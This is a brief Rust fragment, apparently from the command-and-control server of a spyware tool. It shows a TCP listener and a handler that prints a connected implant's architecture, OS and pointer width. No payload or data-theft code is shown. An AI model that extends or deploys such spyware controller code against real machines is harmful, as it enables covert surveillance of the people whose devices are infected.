...
pub fn handle_connected_spyware_client(mut stream: TcpStream) {
    let basic_info = get_basic_spyware_info(&mut stream).expect("Could not get response to basic spyware info. Can not continue.");
    println!("Info about connected spyware - {:?} {:?} {:?}", basic_info.arch, basic_info.target_os, basic_info.pointer_width);
...
pub fn run_server(port: u16) {
    ...
    let address = listener.local_addr().expect("Error while trying to get local address.");
